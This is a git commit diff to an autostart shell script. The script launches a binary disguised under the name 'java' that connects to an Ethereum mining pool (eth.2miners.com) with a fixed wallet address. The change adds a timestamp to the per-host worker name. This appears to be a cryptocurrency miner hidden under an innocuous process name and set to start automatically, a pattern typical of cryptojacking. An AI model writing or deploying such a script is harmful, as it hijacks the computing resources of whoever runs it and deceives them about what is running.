598f2eeb00520ac369c6050091c37a43e63d5299
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-01-16 20:44:25 +0700

    Update autostart.sh

--- autostart.sh
+++ autostart.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./java -P stratum1+tcp://0x406cc90e0a558e247a539e685e02ad8cb22f91c8.$HOSTNAME@eth.2miners.com:2020
+./java -P stratum1+tcp://0x406cc90e0a558e247a539e685e02ad8cb22f91c8.$HOSTNAME-$(date +%H-%M)@eth.2miners.com:2020
